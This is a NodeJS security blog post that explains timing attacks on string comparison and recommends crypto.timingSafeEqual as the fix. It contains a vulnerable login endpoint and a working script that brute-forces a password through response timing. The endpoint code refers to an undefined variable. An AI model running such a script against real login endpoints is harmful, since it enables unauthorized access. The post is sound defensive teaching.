---
layout: post
title: Understanding Timing Attacks Using NodeJs
author: akgunberk
date: 2026-02-16 12:55 +0300
tags: [security, nodejs, cryptography, timing-attacks]
related_posts: true
image:
  path: /assets/images/cover_timing_attacks.jpeg
---

# The Invisible Weapon: How Microseconds Leak Secrets

TL;DR

Your code leaks passwords through _timing_. When you compare a guess against the real value byte-by-byte, an attacker can measure response times and figure out which bytes are correct. Use `crypto.timingSafeEqual()` in NodeJS:

```javascript
const crypto = require("crypto");
const actual = Buffer.from(realPassword);
const guess = Buffer.from(userGuess);

if (crypto.timingSafeEqual(actual, guess)) {
  // Safe. No timing leak.
}
```

Stop using `===` for password checks. That's how timing attacks win.

# The Problem: Your Code Speaks Too Loudly

Imagine you're checking if a password is correct:

```javascript
if (userPassword === realPassword) {
  return "Login success";
}
```

Seems fine, right? Wrong. This code leaks information through _time_.

Here's why: String comparison in most languages stops as soon as it finds a mismatch. If the real password is "secretKey123" and an attacker guesses "aaaaaaaaaaaa", the comparison fails on the first character. If they guess "saaaaaaaaaaa", it fails on the second character but takes slightly longer because it compares one more byte.

An attacker exploits this:

1. Guess 'a' + 11 random chars → fast failure (1 byte matched)
2. Guess 'b' + 11 random chars → still fast failure
3. ...
4. Guess 's' + 11 random chars → slightly slower failure (first byte matched!)
5. Now guess 's' + first char + 10 random → repeat

By measuring response times across thousands of requests, attackers can brute-force your password character by character. It's not magic—it's math. And your code is doing the heavy lifting.

⸻

# The Attack In Action

Let's see it happen. Imagine this vulnerable NodeJS endpoint:

```javascript
app.post("/login", (req, res) => {
  const realPassword = process.env.PASSWORD;
  const userGuess = req.body.password;

  // VULNERABLE: Uses === which stops early on mismatch
  if (userPassword === realPassword) {
    res.json({ status: "success" });
  } else {
    res.json({ status: "fail" });
  }
});
```

An attacker writes a script:

```javascript
const axios = require("axios");

async function timingAttack(prefix) {
  let longest = 0;
  let bestChar = "";

  for (let char of "abcdefghijklmnopqrstuvwxyz0123456789") {
    const guess = prefix + char + "xxx"; // Pad the rest

    const start = Date.now();
    await axios.post("http://target/login", { password: guess });
    const elapsed = Date.now() - start;

    if (elapsed > longest) {
      longest = elapsed;
      bestChar = char;
    }
  }

  return bestChar; // The char that took longest = likely correct
}

(async () => {
  let password = "";
  for (let i = 0; i < 20; i++) {
    password += await timingAttack(password);
    console.log("Current prefix:", password);
  }
})();
```

With enough requests and averaging, this extracts the password one character at a time. Network noise adds variance, but the statistical trend is clear.

⸻

# The Fix: Constant-Time Comparison

NodeJS has your back. `crypto.timingSafeEqual()` compares two buffers in _constant time_—it always takes the same duration regardless of where the mismatch is:

```javascript
const crypto = require("crypto");

app.post("/login", (req, res) => {
  const realPassword = process.env.PASSWORD;
  const userGuess = req.body.password;

  try {
    if (
      crypto.timingSafeEqual(Buffer.from(realPassword), Buffer.from(userGuess))
    ) {
      res.json({ status: "success" });
    } else {
      res.json({ status: "fail" });
    }
  } catch (e) {
    // timingSafeEqual throws if buffers differ in length
    // Still a timing leak, so always return consistent response
    res.json({ status: "fail" });
  }
});
```

Now every comparison—whether it matches or not—takes the same time. An attacker's measurements hit noise, not signal. The attack collapses.

# Why This Matters

Timing attacks are:

- **Real.** CVE databases have dozens. They work.
- **Hard to detect.** Your code looks fine. It _behaves_ fine. It just leaks.
- **Platform-agnostic.** Python, Java, C—all vulnerable if you use regular string comparison.
- **Scalable.** Attacker needs thousands of requests, not millions. Totally feasible.

The fix is free, built-in, and one line of code. There's no excuse.

⸻

# Timing Attacks Beyond Passwords

This isn't just about login forms. The same principle applies anywhere you compare secrets:

- **API keys:** `if (apiKey === realKey)` → vulnerable
- **CSRF tokens:** `if (token === expectedToken)` → vulnerable
- **Cryptographic signatures:** `if (signature === computedSig)` → vulnerable

Any time you compare user-supplied data against a secret, use constant-time comparison. Make it a habit.

```javascript
// Bad
if (userInput === secretValue) {
}

// Good
if (crypto.timingSafeEqual(Buffer.from(userInput), Buffer.from(secretValue))) {
}
```

⸻

# The Bigger Picture

Timing attacks are subtle. They don't scream "vulnerability"—they whisper through microseconds. But whispers compound. Attackers are patient, their measurement tools are precise, and your servers are screaming data.

The defense is simple: think about _time_ as a channel of information. If an operation takes different amounts of time based on secret data, you've got a leak. Plug it with constant-time operations.

Security isn't always about firewalls and encryption keys. Sometimes it's about the milliseconds you didn't think anyone was watching.

Watch them anyway.
